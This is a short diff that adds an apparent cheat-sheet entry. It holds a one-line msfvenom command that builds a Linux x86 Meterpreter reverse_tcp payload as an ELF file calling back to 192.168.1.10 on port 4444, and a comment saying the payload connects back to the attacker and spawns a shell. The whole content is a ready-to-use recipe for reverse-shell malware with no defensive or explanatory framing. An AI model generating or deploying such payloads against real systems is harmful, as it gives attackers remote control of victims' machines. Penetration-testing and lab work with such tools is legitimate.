@@ -1,0 +1,4 @@
+# linux/x86/meterpreter/reverse_tcp
+# This payload connects back to the attacker and spawns a Meterpreter shell on a Linux x86 system.
+
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf > meterpreter.elf
